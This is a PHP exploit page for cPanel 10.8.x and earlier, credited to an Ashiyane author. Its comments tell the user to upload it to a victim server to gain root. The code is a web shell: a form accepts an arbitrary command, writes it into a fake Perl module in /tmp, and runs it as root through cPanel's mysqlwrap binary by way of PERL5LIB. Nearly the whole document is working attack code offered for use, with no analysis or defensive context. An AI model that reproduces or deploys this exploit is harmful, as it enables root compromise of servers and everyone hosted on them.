<!- for use old cpanel exploit ( http://www.milw0rm.com/exploits/2466 ) you need have
<!- bash shell access on victim server but with this new exploit you only need
<!- to upload php file and run this into browser on victim servers.
<!- then you have root Access and you can do anything ....
<!- Coded by nima salehi ( nima@ashiyane.ir )
<!- Ashiyane Security Corporation www.Ashiyane.ir >
<title>cPanel <= 10.8.x cpwrap root exploit (PHP)</title>
<center><img border="2" src="http://www.ashiyane.ir/images/logo.jpg" width="429" height="97"><br><br>
<?

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
echo "<br><br><br><br><br><b>Sorry Safe-mode Is On ( Script Not Work On This Server ) </b><br><br><br><br><br>";
echo "<br><br><br>Powered By Ashiyane Security Corporation <a href=\"http://www.ashiyane.ir\"> www.Ashiyane.ir";
exit();
}

$disablef = @ini_get("disable_functions");
if (!empty($disablef))
{
 $disablef = str_replace(" ","",$disablef);
 $disablef = explode(",",$disablef);
 if (in_array("passthru",$disablef))
 {
 echo "<br><br><br><br><br><b>Sorry Passthru Is Disable ( Script Not Work On This Server ) </b><br><br><br><br><br>";
 echo "<br><br><br>Powered By Ashiyane Security Corporation <a href=\"http://www.ashiyane.ir\"> www.Ashiyane.ir";
 exit();
 }
}

?>

<form method="POST" action="<?php echo $surl; ?>">
Command : <input type="text" name="c" size="40">
<input type="submit" value="  Run  " name="B1"></form>
<textarea cols="60" rows="20" readonly>
<?php
$cmd=$_POST['c'];
if ( $cmd != "" )
{
$f=fopen("/tmp/strict.pm", "w");
fputs($f,'system("'.$cmd.'");');
fclose($f);
passthru("PERL5LIB=/tmp /usr/local/cpanel/bin/mysqlwrap nima");
}
?>
</textarea>
<br>
Powered By  Ashiyane Security Corporation <a href="http://www.ashiyane.ir"> www.Ashiyane.ir
</center>

